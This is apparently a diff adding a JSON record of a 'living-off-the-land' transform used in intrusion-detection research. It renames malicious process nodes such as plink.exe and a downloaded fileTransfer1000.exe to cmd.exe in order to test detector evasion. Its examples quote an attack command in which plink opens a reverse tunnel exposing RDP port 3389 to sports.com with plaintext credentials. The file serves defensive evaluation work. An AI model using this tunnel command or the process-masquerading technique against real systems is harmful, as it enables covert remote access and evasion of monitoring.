@@ -1,0 +1,51 @@
+{
+ "transform": "lotl",
+ "lotl": {
+  "targets": [
+   {
+    "key": "/users/sysadmin/downloads/filetransfer1000.exe",
+    "kind": "process",
+    "gt_nodes": 6,
+    "replacement_key": "/windows/system32/cmd.exe",
+    "replacement": "/Device/HarddiskVolume1/Windows/system32/cmd.exe",
+    "fallback_to_process": false,
+    "baseline_runs": 11964,
+    "renamed_nodes": 6
+   },
+   {
+    "key": "/windows/system32/plink.exe",
+    "kind": "process",
+    "gt_nodes": 1,
+    "replacement_key": "/windows/system32/cmd.exe",
+    "replacement": "/Device/HarddiskVolume1/Windows/system32/cmd.exe",
+    "fallback_to_process": false,
+    "baseline_runs": 11964,
+    "renamed_nodes": 1
+   }
+  ],
+  "renamed_nodes": 7,
+  "renamed_gt": 7,
+  "still_unknown": 0,
+  "baseline_programs": 127,
+  "baseline_processes": 46131,
+  "top_shell": "/windows/system32/cmd.exe",
+  "top_process": "/windows/system32/cmd.exe",
+  "examples": [
+   {
+    "before": "subject /Device/HarddiskVolume1/Windows/system32/plink.exe \"C:/Windows/system32/plink.exe\" sports.com -R 4000:127.0.0.1:3389 -l myguest -pw myguest",
+    "after": "subject /Device/HarddiskVolume1/Windows/system32/cmd.exe \"/Device/HarddiskVolume1/Windows/system32/cmd.exe\" sports.com -R 4000:127.0.0.1:3389 -l myguest -pw myg",
+    "gt": true
+   },
+   {
+    "before": "subject /Device/HarddiskVolume1/Users/sysadmin/Downloads/fileTransfer1000.exe \"C:/Users/sysadmin/Downloads/fileTransfer1000.exe\"",
+    "after": "subject /Device/HarddiskVolume1/Windows/system32/cmd.exe \"/Device/HarddiskVolume1/Windows/system32/cmd.exe\"",
+    "gt": true
+   },
+   {
+    "before": "subject /Device/HarddiskVolume1/Users/sysadmin/Downloads/fileTransfer1000.exe \"C:/Users/sysadmin/Downloads/fileTransfer1000.exe\" --help",
+    "after": "subject /Device/HarddiskVolume1/Windows/system32/cmd.exe \"/Device/HarddiskVolume1/Windows/system32/cmd.exe\" --help",
+    "gt": true
+   }
+  ]
+ }
+}
